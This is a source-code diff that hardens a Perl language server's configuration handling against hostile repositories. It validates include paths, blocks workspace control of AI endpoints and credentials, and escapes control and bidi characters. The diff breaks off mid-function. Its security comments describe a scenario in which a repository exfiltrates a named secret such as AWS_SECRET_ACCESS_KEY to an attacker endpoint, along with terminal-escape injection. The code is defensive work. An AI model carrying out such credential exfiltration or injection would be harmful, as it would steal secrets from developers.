@@ -8,6 +8,7 @@
 
 #[cfg(all(test, not(target_arch = "wasm32")))]
 use crate::platform::resolve_perl_path_with_toolchain;
+use perl_parser_core::path_security::{WorkspacePathError, validate_workspace_path};
 use std::path::{Path, PathBuf};
 #[cfg(not(target_arch = "wasm32"))]
 use std::process::{Command, Output, Stdio};
@@ -191,7 +192,13 @@ pub struct NextEditConfig {
 /// timeout, error, or when AI is disabled.
 #[derive(Debug, Clone)]
 pub struct AiCompletionConfig {
-    /// Whether AI completions are enabled. Default: false.
+    /// Whether the user explicitly enabled AI completions via the LSP client
+    /// configuration channel. Default: false.
+    pub user_enabled: bool,
+    /// Whether a workspace/project `.perl-lsp.toml` opted out (`enabled = false`).
+    /// Project config may only disable AI, never enable it (issue #4997).
+    pub project_opt_out: bool,
+    /// Effective runtime flag: `user_enabled && !project_opt_out`.
     pub enabled: bool,
     /// Provider type. Currently only "openai_compat" is supported.
     pub provider: String,
@@ -215,6 +222,8 @@ pub struct AiCompletionConfig {
     pub max_inflight: u32,
     /// Whether to fall back to deterministic completions on AI failure. Default: true.
     pub fallback: bool,
+    /// Allow plain HTTP to loopback-only local model endpoints. Default: false.
+    pub local_model_mode: bool,
     /// Streaming-specific configuration.
     pub streaming: AiStreamingConfig,
 }
@@ -265,15 +274,29 @@ fn is_http_header_name_byte(byte: u8) -> bool {
 /// Streaming sub-configuration for AI completions.
 #[derive(Debug, Clone)]
 pub struct AiStreamingConfig {
-    /// Whether streaming mode is enabled. Default: true.
+    /// Whether the user enabled streaming via the LSP client configuration channel.
+    /// Default: true (streaming is on when AI completions are enabled).
+    pub user_enabled: bool,
+    /// Effective runtime flag, currently mirrors `user_enabled`.
     pub enabled: bool,
     /// Minimum milliseconds between emitted updates. Default: 60.
     pub update_debounce_ms: u64,
 }
 
+/// Recompute effective AI completion flags from user/project inputs.
+///
+/// `enabled` is true only when the user enabled AI and the project did not
+/// opt out. Streaming `enabled` currently mirrors streaming `user_enabled`.
+pub fn recompute_ai_completion_effective(ai: &mut AiCompletionConfig) {
+    ai.enabled = ai.user_enabled && !ai.project_opt_out;
+    ai.streaming.enabled = ai.streaming.user_enabled;
+}
+
 impl Default for AiCompletionConfig {
     fn default() -> Self {
         Self {
+            user_enabled: false,
+            project_opt_out: false,
             enabled: false,
             provider: "openai_compat".to_string(),
             endpoint: String::new(),
@@ -286,6 +309,7 @@ impl Default for AiCompletionConfig {
             rate_limit_rps: 1.0,
             max_inflight: 1,
             fallback: true,
+            local_model_mode: false,
             streaming: AiStreamingConfig::default(),
         }
     }
@@ -293,7 +317,7 @@ impl Default for AiCompletionConfig {
 
 impl Default for AiStreamingConfig {
     fn default() -> Self {
-        Self { enabled: true, update_debounce_ms: 60 }
+        Self { user_enabled: true, enabled: true, update_debounce_ms: 60 }
     }
 }
 
@@ -354,7 +378,7 @@ impl ServerConfig {
             if let Some(chained) = inlay.get("chainedHints").and_then(|v| v.as_bool()) {
                 self.inlay_hints_chained_hints = chained;
             }
-            if let Some(max_len) = inlay.get("maxLength").and_then(|v| v.as_u64()) {
+            if let Some(max_len) = inlay.get("maxLength").and_then(as_config_u64) {
                 self.inlay_hints_max_length = max_len as usize;
             }
         }
@@ -405,14 +429,9 @@ impl ServerConfig {
                 }
                 self.perlcritic_severity = clamped;
             }
-            if let Some(profile) = critic.get("profile").and_then(|v| v.as_str()) {
-                let profile = profile.trim();
-                self.perlcritic_profile = (!profile.is_empty()).then(|| profile.to_string());
-            }
-            if let Some(theme) = critic.get("theme").and_then(|v| v.as_str()) {
-                let theme = theme.trim();
-                self.perlcritic_theme = (!theme.is_empty()).then(|| theme.to_string());
-            }
+            // Security: do NOT honour LSP-channel perlcritic.profile / theme (issue #5001).
+            // Subprocess profile paths may only be applied via trusted project config
+            // (`.perl-lsp.toml` → `apply_to_server_config`).
         }
 
         // Native `critic.*` settings are the product-surface keys. They are parsed
@@ -439,7 +458,16 @@ impl ServerConfig {
             }
             if let Some(engine) = critic.get("engine").and_then(|v| v.as_str()) {
                 match parse_critic_engine(engine) {
-                    Some(engine) => self.critic_engine = engine,
+                    Some(CriticEngine::Native) => self.critic_engine = CriticEngine::Native,
+                    Some(CriticEngine::Legacy) => {
+                        tracing::warn!(
+                            target: "perl_lsp::config",
+                            setting = "critic.engine",
+                            value = %engine,
+                            "ignoring legacy critic.engine from LSP settings channel; \
+                             use .perl-lsp.toml for trusted legacy subprocess configuration",
+                        );
+                    }
                     None => tracing::warn!(
                         target: "perl_lsp::config",
                         setting = "critic.engine",
@@ -485,14 +513,11 @@ impl ServerConfig {
                     ),
                 }
             }
-            if let Some(profile) = formatting.get("profile").and_then(|v| v.as_str()) {
-                let profile = profile.trim();
-                self.perltidy_profile = (!profile.is_empty()).then(|| profile.to_string());
-            }
-            if let Some(len) = formatting.get("maximumLineLength").and_then(|v| v.as_u64()) {
+            // Security: do NOT honour LSP-channel formatting.profile / extraArgs (issue #5001).
+            if let Some(len) = formatting.get("maximumLineLength").and_then(as_config_u64) {
                 self.perltidy_maximum_line_length = Some(len as u32);
             }
-            if let Some(indent) = formatting.get("indentColumns").and_then(|v| v.as_u64()) {
+            if let Some(indent) = formatting.get("indentColumns").and_then(as_config_u64) {
                 self.perltidy_indent_columns = Some(indent as u32);
             }
             if let Some(tabs) = formatting.get("tabs").and_then(|v| v.as_bool()) {
@@ -513,22 +538,17 @@ impl ServerConfig {
             if let Some(align) = formatting.get("verticalAlignment").and_then(|v| v.as_bool()) {
                 self.perltidy_vertical_alignment = Some(align);
             }
-            if let Some(block) = formatting.get("blockCommentIndentation").and_then(|v| v.as_u64())
-            {
+            if let Some(block) = formatting.get("blockCommentIndentation").and_then(as_config_u64) {
                 self.perltidy_block_comment_indentation = Some(block as u32);
             }
-            if let Some(args) = formatting.get("extraArgs").and_then(|v| v.as_array()) {
-                self.perltidy_extra_args =
-                    args.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect();
-            }
-            if let Some(timeout) = formatting.get("timeoutSecs").and_then(|v| v.as_u64()) {
+            if let Some(timeout) = formatting.get("timeoutSecs").and_then(as_config_u64) {
                 self.perltidy_timeout_secs = timeout;
             }
         }
 
         if let Some(ai) = settings.get("aiCompletion") {
             if let Some(enabled) = ai.get("enabled").and_then(|v| v.as_bool()) {
-                self.ai_completion.enabled = enabled;
+                self.ai_completion.user_enabled = enabled;
             }
             if let Some(provider) = ai.get("provider").and_then(|v| v.as_str()) {
                 self.ai_completion.provider = provider.to_string();
@@ -573,14 +593,48 @@ impl ServerConfig {
             if let Some(fallback) = ai.get("fallback").and_then(|v| v.as_bool()) {
                 self.ai_completion.fallback = fallback;
             }
+            if let Some(local_model_mode) = ai.get("localModelMode").and_then(|v| v.as_bool()) {
+                self.ai_completion.local_model_mode = local_model_mode;
+            }
             if let Some(streaming) = ai.get("streaming") {
                 if let Some(enabled) = streaming.get("enabled").and_then(|v| v.as_bool()) {
-                    self.ai_completion.streaming.enabled = enabled;
+                    self.ai_completion.streaming.user_enabled = enabled;
                 }
                 if let Some(debounce) = streaming.get("updateDebounceMs").and_then(|v| v.as_u64()) {
                     self.ai_completion.streaming.update_debounce_ms = debounce;
                 }
             }
+            recompute_ai_completion_effective(&mut self.ai_completion);
+        }
+
+        // Warn on wrong-type values for well-known settings. (#5093)
+        // The and_then(|v| v.as_*) guards above silently ignore type mismatches;
+        // this pass surfaces them so users know their config is being ignored.
+        warn_on_type_mismatch(settings, "inlayHints", "enabled", "boolean");
+        warn_on_type_mismatch(settings, "inlayHints", "parameterHints", "boolean");
+        warn_on_type_mismatch(settings, "inlayHints", "typeHints", "boolean");
+        warn_on_type_mismatch(settings, "testRunner", "enabled", "boolean");
+        warn_on_type_mismatch(settings, "diagnostics", "enabled", "boolean");
+        warn_on_type_mismatch(settings, "critic", "enabled", "boolean");
+        warn_on_type_mismatch(settings, "formatting", "enabled", "boolean");
+    }
+}
+
+/// Log a warning when a config value has the wrong type. (#5093)
+fn warn_on_type_mismatch(settings: &serde_json::Value, section: &str, field: &str, expected: &str) {
+    if let Some(section_val) = settings.get(section)
+        && let Some(field_val) = section_val.get(field)
+    {
+        let is_correct = match expected {
+            "boolean" => field_val.is_boolean(),
+            "string" => field_val.is_string(),
+            "number" => field_val.is_u64() || field_val.is_i64() || field_val.is_f64(),
+            _ => true,
+        };
+        if !is_correct {
+            tracing::warn!(
+                "Config {section}.{field} has wrong type (expected {expected}), ignoring value: {field_val}"
+            );
         }
     }
 }
@@ -650,10 +704,18 @@ pub enum Perl5LibPrecedence {
 pub struct WorkspaceConfig {
     /// Workspace-root-relative include paths for module resolution.
     ///
-    /// Relative entries are resolved against the workspace root. Absolute
-    /// entries are honored literally as external include roots.
+    /// Only relative entries that remain inside the workspace after
+    /// normalization are accepted from the resource-scoped client-settings
+    /// channel (`perl.workspace.includePaths`). Absolute external roots
+    /// belong in [`Self::external_include_paths`].
     /// Default: `["lib", ".", "local/lib/perl5"]`
     pub include_paths: Vec<String>,
+
+    /// Machine-scoped external include roots (absolute paths).
+    ///
+    /// Populated from `perl.workspace.externalIncludePaths`, which VS Code
+    /// exposes as `perl-lsp.externalIncludePaths` with `scope: machine`.
+    pub external_include_paths: Vec<String>,
 
     /// Additional file extensions accepted during workspace discovery.
     pub discovery_extra_extensions: Vec<String>,
@@ -705,6 +767,7 @@ impl Default for WorkspaceConfig {
     fn default() -> Self {
         Self {
             include_paths: vec!["lib".to_string(), ".".to_string(), "local/lib/perl5".to_string()],
+            external_include_paths: Vec::new(),
             discovery_extra_extensions: Vec::new(),
             discovery_extra_skipped_dirs: Vec::new(),
             use_system_inc: false,
@@ -718,6 +781,137 @@ impl Default for WorkspaceConfig {
             perl5lib_precedence: Perl5LibPrecedence::Prepend,
         }
     }
+}
+
+/// Context for [`WorkspaceConfig::update_from_value_with_context`].
+#[derive(Debug, Clone, Copy, Default)]
+pub struct WorkspaceConfigUpdateContext<'a> {
+    /// Workspace root used to reject traversal in resource-scoped `includePaths`.
+    pub workspace_root: Option<&'a Path>,
+    /// When `false`, ignore `externalIncludePaths` (folder-scoped client payloads).
+    pub apply_external_include_paths: bool,
+}
+
+/// A resource-scoped `includePaths` entry rejected during client-settings validation.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct RejectedClientIncludePath {
+    /// The raw, as-configured entry string.
+    pub entry: String,
+    /// Why it was rejected.
+    pub reason: RejectedClientIncludePathReason,
+}
+
+/// Why a client-settings `includePaths` / `externalIncludePaths` entry was rejected.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum RejectedClientIncludePathReason {
+    /// Absolute paths must use `externalIncludePaths` (machine scope) instead.
+    Absolute,
+    /// Relative entry failed workspace containment validation.
+    EscapesWorkspace(String),
+    /// `externalIncludePaths` entries must be absolute filesystem roots.
+    ExternalRelative,
+    /// `externalIncludePaths` entries must not contain null/control characters.
+    ExternalInvalidCharacters,
+}
+
+impl RejectedClientIncludePath {
+    /// Render a single human-readable line for logs and editor notifications.
+    #[must_use]
+    pub fn render(&self) -> String {
+        match &self.reason {
+            RejectedClientIncludePathReason::Absolute => format!(
+                "'{}': absolute paths are not allowed in `perl.workspace.includePaths` \
+                 (workspace-supplied). Move this entry to `perl-lsp.externalIncludePaths` \
+                 in your user settings instead.",
+                self.entry
+            ),
+            RejectedClientIncludePathReason::EscapesWorkspace(detail) => {
+                format!("'{}': escapes the workspace root ({detail})", self.entry)
+            }
+            RejectedClientIncludePathReason::ExternalRelative => format!(
+                "'{}': relative paths are not allowed in `perl.workspace.externalIncludePaths`; \
+                 use `perl.workspace.includePaths` for workspace-relative roots instead.",
+                self.entry
+            ),
+            RejectedClientIncludePathReason::ExternalInvalidCharacters => format!(
+                "'{}': contains null bytes or disallowed control characters",
+                escape_for_display(&self.entry)
+            ),
+        }
+    }
+}
+
+fn validate_resource_include_path_entry(
+    entry: &str,
+    workspace_root: Option<&Path>,
+) -> Result<(), RejectedClientIncludePathReason> {
+    let trimmed = entry.trim();
+    if trimmed.is_empty() {
+        return Err(RejectedClientIncludePathReason::EscapesWorkspace(
+            "empty include path".to_string(),
+        ));
+    }
+
+    let candidate = Path::new(trimmed);
+    if candidate.is_absolute() {
+        return Err(RejectedClientIncludePathReason::Absolute);
+    }
+
+    if let Some(root) = workspace_root {
+        if let Err(err) = validate_workspace_path(candidate, root) {
+            return Err(RejectedClientIncludePathReason::EscapesWorkspace(err.to_string()));
+        }
+    }
+
+    Ok(())
+}
+
+fn parse_external_include_paths(
+    paths: &[serde_json::Value],
+) -> (Vec<String>, Vec<RejectedClientIncludePath>) {
+    let mut accepted = Vec::new();
+    let mut rejected = Vec::new();
+    for value in paths {
+        let Some(entry) = value.as_str() else {
+            continue;
+        };
+        let trimmed = entry.trim();
+        if trimmed.is_empty() {
+            continue;
+        }
+        if external_include_path_has_invalid_characters(trimmed) {
+            tracing::warn!(
+                target: "perl_lsp::config",
+                entry = %escape_for_display(trimmed),
+                "rejected perl.workspace.externalIncludePaths entry with null/control characters"
+            );
+            rejected.push(RejectedClientIncludePath {
+                entry: trimmed.to_string(),
+                reason: RejectedClientIncludePathReason::ExternalInvalidCharacters,
+            });
+            continue;
+        }
+        // Machine-scoped external roots must be absolute. Relative entries belong in
+        // resource-scoped `includePaths` (validated against the workspace root).
+        if !Path::new(trimmed).is_absolute() {
+            tracing::warn!(
+                target: "perl_lsp::config",
+                entry = %escape_for_display(trimmed),
+                "rejected relative perl.workspace.externalIncludePaths entry; use includePaths for workspace-relative roots"
+            );
+            rejected.push(RejectedClientIncludePath {
+                entry: trimmed.to_string(),
+                reason: RejectedClientIncludePathReason::ExternalRelative,
+            });
+            continue;
+        }
+        accepted.push(trimmed.to_string());
+    }
+    (accepted, rejected)
+}
+
+fn external_include_path_has_invalid_characters(entry: &str) -> bool {
+    entry.chars().any(|c| c == '\0' || (c.is_control() && c != '\t'))
 }
 
 fn normalize_include_path(path: &str) -> Option<String> {
@@ -780,6 +974,17 @@ fn string_array(value: Option<&serde_json::Value>) -> Option<Vec<String>> {
     })
 }
 
+/// Parse a JSON numeric value into `u64`, accepting both integer and float forms.
+///
+/// `serde_json::Value::as_u64()` rejects JSON floats (e.g. `4.0`), which some
+/// configuration generators emit. This helper accepts both `4` and `4.0` and
+/// also rejects negative values (all config numeric fields are non-negative).
+fn as_config_u64(value: &serde_json::Value) -> Option<u64> {
+    value
+        .as_u64()
+        .or_else(|| value.as_f64().filter(|f| *f >= 0.0 && f.is_finite()).map(|f| f as u64))
+}
+
 impl WorkspaceConfig {
     /// Parse a `PERL5LIB` environment variable value into a list of paths.
     ///
@@ -800,18 +1005,24 @@ impl WorkspaceConfig {
     /// If `self.use_perl5lib` is `false`, or `perl5lib_paths` is empty, the
     /// returned list contains only `self.include_paths` entries (trimmed and deduplicated).
     pub fn effective_include_paths(&self, perl5lib_paths: &[String]) -> Vec<String> {
+        let configured = dedupe_preserve_order(
+            self.include_paths
+                .iter()
+                .map(String::as_str)
+                .chain(self.external_include_paths.iter().map(String::as_str)),
+        );
         if !self.use_perl5lib || perl5lib_paths.is_empty() {
-            return dedupe_preserve_order(self.include_paths.iter().map(String::as_str));
+            return configured;
         }
         match self.perl5lib_precedence {
             Perl5LibPrecedence::Prepend => dedupe_preserve_order(
                 perl5lib_paths
                     .iter()
                     .map(String::as_str)
-                    .chain(self.include_paths.iter().map(String::as_str)),
+                    .chain(configured.iter().map(String::as_str)),
             ),
             Perl5LibPrecedence::Append => dedupe_preserve_order(
-                self.include_paths
+                configured
                     .iter()
                     .map(String::as_str)
                     .chain(perl5lib_paths.iter().map(String::as_str)),
@@ -858,11 +1069,59 @@ impl WorkspaceConfig {
     }
 
     /// Update workspace configuration from LSP settings.
-    pub fn update_from_value(&mut self, settings: &serde_json::Value) {
+    ///
+    /// Fail-closed for `externalIncludePaths`: the default context ignores them.
+    /// Callers on the global / machine configuration channel must use
+    /// [`Self::update_from_value_with_context`] with
+    /// `apply_external_include_paths: true`.
+    pub fn update_from_value(
+        &mut self,
+        settings: &serde_json::Value,
+    ) -> Vec<RejectedClientIncludePath> {
+        self.update_from_value_with_context(
+            settings,
+            WorkspaceConfigUpdateContext {
+                workspace_root: None,
+                apply_external_include_paths: false,
+            },
+        )
+    }
+
+    /// Update workspace configuration from LSP settings with validation context.
+    ///
+    /// Resource-scoped `includePaths` reject absolute entries and any relative
+    /// entry that escapes `workspace_root` when provided. `externalIncludePaths`
+    /// are accepted only when `apply_external_include_paths` is true (global /
+    /// machine channel).
+    pub fn update_from_value_with_context(
+        &mut self,
+        settings: &serde_json::Value,
+        context: WorkspaceConfigUpdateContext<'_>,
+    ) -> Vec<RejectedClientIncludePath> {
+        let mut rejected = Vec::new();
         if let Some(workspace) = settings.get("workspace") {
             if let Some(paths) = workspace.get("includePaths").and_then(|v| v.as_array()) {
-                self.include_paths =
-                    paths.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect();
+                let mut valid = Vec::with_capacity(paths.len());
+                for value in paths {
+                    let Some(entry) = value.as_str() else {
+                        continue;
+                    };
+                    match validate_resource_include_path_entry(entry, context.workspace_root) {
+                        Ok(()) => valid.push(entry.to_string()),
+                        Err(reason) => rejected
+                            .push(RejectedClientIncludePath { entry: entry.to_string(), reason }),
+                    }
+                }
+                self.include_paths = valid;
+            }
+            if context.apply_external_include_paths {
+                if let Some(paths) =
+                    workspace.get("externalIncludePaths").and_then(|v| v.as_array())
+                {
+                    let (accepted, external_rejected) = parse_external_include_paths(paths);
+                    self.external_include_paths = accepted;
+                    rejected.extend(external_rejected);
+                }
             }
             if let Some(extensions) = string_array(workspace.get("discoveryExtensions")) {
                 self.discovery_extra_extensions = extensions;
@@ -881,7 +1140,7 @@ impl WorkspaceConfig {
             // would let a hostile project execute arbitrary code via the @INC
             // probe (issue #3729). The interpreter / args remain whatever the
             // user (not the workspace) configured globally.
-            if let Some(timeout) = workspace.get("resolutionTimeout").and_then(|v| v.as_u64()) {
+            if let Some(timeout) = workspace.get("resolutionTimeout").and_then(as_config_u64) {
                 self.resolution_timeout_ms = timeout;
             }
             if let Some(use_p5l) = workspace.get("usePerl5lib").and_then(|v| v.as_bool()) {
@@ -910,6 +1169,7 @@ impl WorkspaceConfig {
                 }
             }
         }
+        rejected
     }
 
     /// Get system @INC paths (lazily populated).
@@ -1149,23 +1409,27 @@ pub struct ProjectFeaturesConfig {
 }
 
 /// `[ai_completion]` section of `.perl-lsp.toml`.
+///
+/// Security: this struct intentionally does NOT carry `endpoint`,
+/// `api_key_env`, `api_key_header`, or `api_key_prefix`. Those four fields
+/// select a network destination and a process-environment credential; if a
+/// workspace-supplied `.perl-lsp.toml` could set them, a hostile cloned
+/// repository could name an arbitrary environment variable (e.g.
+/// `AWS_SECRET_ACCESS_KEY`) and have its value POSTed to an attacker-chosen
+/// endpoint on the first inline-completion request (issue #4955). See the
+/// analogous `perlPath`/`perlArgs` precedent below (issue #3729).
+///
+/// `enabled`, `provider`, and `model` are also not workspace-authoritative
+/// (issue #4997): project config may only opt out (`enabled = false`), never
+/// activate a remote AI backend or override user-owned provider/model choice.
+/// Those settings arrive only through the LSP client configuration channel
+/// (`ServerConfig::update_from_value`'s `aiCompletion` block).
 #[derive(Debug, Clone, Default, serde::Deserialize)]
 #[serde(default)]
 pub struct ProjectAiCompletionConfig {
-    /// Whether AI completions are enabled.
+    /// Opt-out only: when `false`, disables AI completions for this workspace.
+    /// `true` is ignored — a repository cannot turn AI on.
     pub enabled: Option<bool>,
-    /// Provider type.
-    pub provider: Option<String>,
-    /// API endpoint URL.
-    pub endpoint: Option<String>,
-    /// Model identifier.
-    pub model: Option<String>,
-    /// Environment variable name for API key.
-    pub api_key_env: Option<String>,
-    /// HTTP header used to send the API key.
-    pub api_key_header: Option<String>,
-    /// Optional auth scheme prepended before the API key.
-    pub api_key_prefix: Option<String>,
 }
 
 /// `[next_edit]` section of `.perl-lsp.toml`.
@@ -1441,31 +1705,27 @@ impl ProjectConfig {
         if let Some(hints) = self.features.inlay_hints {
             config.inlay_hints_enabled = hints;
         }
-        if let Some(enabled) = self.ai_completion.enabled {
-            config.ai_completion.enabled = enabled;
+        // Security: project config may only opt out of AI completions, never
+        // enable them or override user-owned provider/model (issue #4997).
+        if self.ai_completion.enabled == Some(true) {
+            tracing::warn!(
+                target: "perl_lsp::config",
+                setting = "ai_completion.enabled",
+                "workspace-supplied ai_completion.enabled=true is ignored; \
+                 AI completions require user-level configuration",
+            );
         }
-        if let Some(ref provider) = self.ai_completion.provider {
-            config.ai_completion.provider = provider.clone();
-        }
-        if let Some(ref endpoint) = self.ai_completion.endpoint {
-            config.ai_completion.endpoint = endpoint.clone();
-        }
-        if let Some(ref model) = self.ai_completion.model {
-            config.ai_completion.model = model.clone();
-        }
-        if let Some(ref key_env) = self.ai_completion.api_key_env {
-            config.ai_completion.api_key_env = key_env.clone();
-        }
-        if let Some(ref key_header) = self.ai_completion.api_key_header {
-            if let Some(header) = normalize_ai_api_key_header(key_header) {
-                config.ai_completion.api_key_header = header;
-            }
-        }
-        if let Some(ref key_prefix) = self.ai_completion.api_key_prefix {
-            if let Some(prefix) = normalize_ai_api_key_prefix(key_prefix) {
-                config.ai_completion.api_key_prefix = prefix;
-            }
-        }
+        config.ai_completion.project_opt_out = self.ai_completion.enabled == Some(false);
+        // Security: do NOT honour workspace-supplied endpoint / api_key_env /
+        // api_key_header / api_key_prefix. Allowing a hostile project to pick
+        // both the destination and the process-environment credential name
+        // would let it exfiltrate an arbitrary named secret (issue #4955).
+        // These settings arrive only via the LSP client/server configuration
+        // channel. Project activation is closed here (#4997); VS Code declares
+        // AI toggles `scope: machine`. Non-VS Code clients that forward
+        // workspace settings into `didChangeConfiguration` remain a residual
+        // provenance gap (documented in AI_COMPLETION.md).
+        recompute_ai_completion_effective(&mut config.ai_completion);
         if let Some(enabled) = self.next_edit.enabled {
             config.next_edit.enabled = enabled;
         }
@@ -1561,9 +1821,85 @@ impl ProjectConfig {
     ///
     /// Only applies list settings when their TOML lists are non-empty, so that
     /// absent keys leave defaults unchanged (distinct from explicit `[]`).
-    pub fn apply_to_workspace_config(&self, config: &mut WorkspaceConfig) {
+    ///
+    /// # Security
+    ///
+    /// `include_paths` entries come from `.perl-lsp.toml`, a file checked into
+    /// the (possibly hostile) cloned workspace — an **untrusted** channel.
+    /// The LSP client-settings channel applied via
+    /// [`WorkspaceConfig::update_from_value`] is NOT validated here; its
+    /// provenance is not distinguished in this slice (see issue #4998 — in
+    /// VS Code `perl-lsp.includePaths` is `scope: resource`, so workspace and
+    /// folder values reach it too). Mirroring the `perlPath` /
+    /// `perlArgs` precedent (issue #3729, see the comment at
+    /// `update_from_value`), this rejects entries that could let a hostile
+    /// project read outside the workspace:
+    ///
+    /// - Absolute entries are always rejected. Legitimate external lib roots
+    ///   must be configured through the LSP client-settings channel, not via
+    ///   workspace-supplied `.perl-lsp.toml`. Note that channel is itself
+    ///   pending provenance hardening (issue #4998); this slice only closes
+    ///   the `.perl-lsp.toml` route.
+    /// - Relative entries that escape the workspace root after normalization
+    ///   (lexical `..` traversal, or a symlink that resolves outside the
+    ///   workspace) are rejected.
+    ///
+    /// Rejected entries are dropped from `config.include_paths` (never
+    /// silently applied) and returned so the caller can surface an actionable
+    /// warning — a bad entry must be debuggable, not just silently ignored.
+    pub fn apply_to_workspace_config(
+        &self,
+        config: &mut WorkspaceConfig,
+        workspace_root: &Path,
+    ) -> Vec<RejectedIncludePath> {
+        let mut rejected = Vec::new();
+        let mut skip_include_paths = false;
         if !self.perl.include_paths.is_empty() {
-            config.include_paths = self.perl.include_paths.clone();
+            // Fail closed: if the workspace root itself cannot be canonicalized
+            // there is nothing to validate containment against, so no entry can
+            // be trusted. Detected once here rather than inferred per-entry, so
+            // the reported reason names the actual cause instead of blaming
+            // each path for "escaping" a root that could not be read.
+            if let Err(err) = std::fs::canonicalize(workspace_root) {
+                // The failure belongs to the workspace root, not to any single
+                // entry, so record it once instead of repeating an identical
+                // warning per configured path.
+                rejected.push(RejectedIncludePath {
+                    entry: workspace_root.display().to_string(),
+                    reason: RejectedIncludePathReason::WorkspaceRootUnavailable(err.to_string()),
+                });
+                // Fail closed for include roots: entries are dropped, not merely
+                // reported, since leaving a previously-set list in place would
+                // let an unvalidated path stay live.
+                //
+                // Scoped deliberately: this is a path-validation failure, not a
+                // failure of the whole project config, so discovery extensions,
+                // skip lists and the perl5lib settings below still apply.
+                config.include_paths.clear();
+                skip_include_paths = true;
+            }
+            let mut valid = Vec::with_capacity(self.perl.include_paths.len());
+            for entry in self.perl.include_paths.iter().filter(|_| !skip_include_paths) {
+                let candidate = Path::new(entry);
+                if candidate.is_absolute() {
+                    rejected.push(RejectedIncludePath {
+                        entry: entry.clone(),
+                        reason: RejectedIncludePathReason::Absolute,
+                    });
+                    continue;
+                }
+                if let Err(err) = validate_workspace_path(candidate, workspace_root) {
+                    rejected.push(RejectedIncludePath {
+                        entry: entry.clone(),
+                        reason: RejectedIncludePathReason::from_path_error(&err),
+                    });
+                    continue;
+                }
+                valid.push(entry.clone());
+            }
+            if !skip_include_paths {
+                config.include_paths = valid;
+            }
         }
         if !self.perl.discovery_extensions.is_empty() {
             config.discovery_extra_extensions =
@@ -1578,6 +1914,158 @@ impl ProjectConfig {
         }
         if let Some(ref prec) = self.perl.perl5lib_precedence {
             config.perl5lib_precedence = prec.clone();
+        }
+        rejected
+    }
+}
+
+/// A `.perl-lsp.toml` `[perl].include_paths` entry rejected during validation.
+///
+/// Rejection happens in [`ProjectConfig::apply_to_workspace_config`]; see its
+/// `# Security` doc comment for the trust-boundary rationale.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct RejectedIncludePath {
+    /// The raw, as-configured entry string.
+    pub entry: String,
+    /// Why it was rejected.
+    pub reason: RejectedIncludePathReason,
+}
+
+/// Why a `.perl-lsp.toml` `include_paths` entry was rejected.
+///
+/// These categories mirror [`WorkspacePathError`] rather than collapsing into
+/// one bucket: this is a public operational surface (doctor output,
+/// `window/showMessage`), and "escapes the workspace root" is simply false for
+/// an entry containing null bytes or for an unreadable workspace root.
+#[non_exhaustive]
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum RejectedIncludePathReason {
+    /// Absolute paths are never honoured from workspace-supplied
+    /// `.perl-lsp.toml` (mirrors the perlPath/perlArgs precedent, issue
+    /// #3729). External lib roots must come through the LSP client-settings
+    /// channel instead — which is itself pending provenance hardening under
+    /// issue #4998, so this is a narrower statement than "trusted".
+    Absolute,
+    /// Lexical `..` traversal out of the workspace.
+    Traversal(String),
+    /// Normalizes to a location outside the workspace root.
+    OutsideWorkspace(String),
+    /// A symlink component resolves to a target outside the workspace root.
+    SymlinkOutsideWorkspace(String),
+    /// Null bytes or disallowed control characters. Checked before any
+    /// containment logic, so this is not a containment failure.
+    InvalidCharacters,
+    /// The workspace root itself could not be canonicalized (missing,
+    /// unreadable, or not a directory), so no entry could be validated
+    /// against it. Every entry is rejected — this is the fail-closed case.
+    WorkspaceRootUnavailable(String),
+}
+
+/// Escape control characters in a workspace-controlled string before it reaches
+/// a terminal or an editor message.
+///
+/// `include_paths` entries come from `.perl-lsp.toml`, which a hostile cloned
+/// repository controls. Rendering them raw lets an entry inject ANSI/OSC escape
+/// sequences into `perl-lsp doctor` output and `window/showMessage` — so the
+/// warning *about* a malicious path would itself be the injection vector
+/// (CWE-150).
+///
+/// Note the absolute-path branch of `apply_to_workspace_config` rejects before
+/// `validate_workspace_path` runs, so its `InvalidPathCharacters` check never
+/// sees those entries. Escaping centrally here covers every rejection reason
+/// regardless of which branch produced it.
+fn escape_for_display(value: &str) -> String {
+    value
+        .chars()
+        .flat_map(|c| {
+            if c == '\t' || !needs_display_escape(c) {
+                vec![c]
+            } else {
+                format!("\\u{{{:04x}}}", c as u32).chars().collect()
+            }
+        })
+        .collect()
+}
+
+/// Characters that must not reach a terminal or editor message verbatim.
+///
+/// `char::is_control` covers C0, DEL and C1 — which handles ANSI/OSC injection.
+/// It does NOT cover the Unicode bidirectional formatting characters, which are
+/// category `Cf` rather than `Cc`. Those visually reorder surrounding text
+/// without being control codes (the "Trojan Source" class, CVE-2021-42574), so
+/// a rejected entry could still render as a path other than the one configured.
+/// Zero-width characters are included for the same reason: they let two
+/// different entries display identically.
+fn needs_display_escape(c: char) -> bool {
+    if c.is_control() {
+        return true;
+    }
+    matches!(
+        c,
+        // zero-width space/ZWNJ/ZWJ, LRM/RLM
+        '\u{200b}'..='\u{200f}'
+        // LRE, RLE, PDF, LRO, RLO
+        | '\u{202a}'..='\u{202e}'
+        // LRI, RLI, FSI, PDI
+        | '\u{2066}'..='\u{2069}'
+        // zero-width no-break space / BOM
+        | '\u{feff}'
+    )
+}
+
+impl RejectedIncludePath {
+    /// Render a single human-readable line for `window/showMessage` / doctor reports.
+    ///
+    /// The entry is escaped via [`escape_for_display`]; it is workspace-controlled.
+    #[must_use]
+    pub fn render(&self) -> String {
+        let entry = escape_for_display(&self.entry);
+        match &self.reason {
+            RejectedIncludePathReason::Absolute => format!(
+                "'{}': absolute include_paths are not allowed in .perl-lsp.toml \
+                 (workspace-supplied). Configure external lib roots in your own \
+                 editor settings instead; not in a file checked into the repository.",
+                entry
+            ),
+            RejectedIncludePathReason::Traversal(detail) => {
+                format!("'{}': traverses out of the workspace root ({detail})", entry)
+            }
+            RejectedIncludePathReason::OutsideWorkspace(detail) => {
+                format!("'{}': resolves outside the workspace root ({detail})", entry)
+            }
+            RejectedIncludePathReason::SymlinkOutsideWorkspace(detail) => {
+                format!(
+                    "'{}': a symlink in this path resolves outside the workspace root ({detail})",
+                    entry
+                )
+            }
+            RejectedIncludePathReason::InvalidCharacters => {
+                format!("'{}': contains null bytes or disallowed control characters", entry)
+            }
